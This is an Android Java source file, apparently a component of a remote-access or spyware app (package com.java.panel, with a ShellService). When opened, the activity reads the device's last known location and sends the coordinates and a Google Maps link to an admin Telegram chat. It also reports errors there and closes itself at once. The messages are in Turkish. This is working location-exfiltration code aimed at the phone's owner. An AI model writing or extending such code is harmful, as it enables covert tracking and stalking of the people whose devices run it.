package com.java.panel;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class LocationActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                    ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    
                    Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

                    if (loc != null) {
                        double lat = loc.getLatitude();
                        double lon = loc.getLongitude();
                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, 
                                "📍 Konum Raporu:\nEnlem: " + lat + "\nBoylam: " + lon + "\n🔗 https://www.google.com/maps?q=" + lat + "," + lon);
                        }
                    } else {
                        if (ShellService.instance != null) {
                            ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Konum GPS verisi alınamadı.");
                        }
                    }
                }
            }
        } catch (Exception e) {
            if (ShellService.instance != null) {
                ShellService.instance.sendTelegramMessage(ShellService.instance.ADMIN_CHAT_ID, "❌ Konum hatası: " + e.getMessage());
            }
        }
        finish();
    }
}
